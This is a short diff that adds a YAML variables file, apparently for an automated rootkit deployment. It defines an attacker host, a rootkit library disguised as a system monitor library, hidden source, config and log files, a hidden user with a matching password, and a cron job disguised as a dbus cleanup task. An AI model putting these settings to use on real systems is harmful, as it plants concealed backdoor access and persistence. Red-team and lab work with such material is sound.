@@ -1,0 +1,11 @@
+---
+username: cyrano
+attacker_host: attacker
+compile_library: true
+rootkit_lib: /lib/x86_64-linux-gnu/libsysmon.so.1
+rootkit_src: /etc/.kit_src.c
+rootkit_conf_dir: /etc/.kit_conf
+rootkit_log: /var/log/.kit_log
+hidden_user: cyrano
+hidden_user_pass: cyrano
+cron_job_file: /etc/cron.d/dbus-cleanup
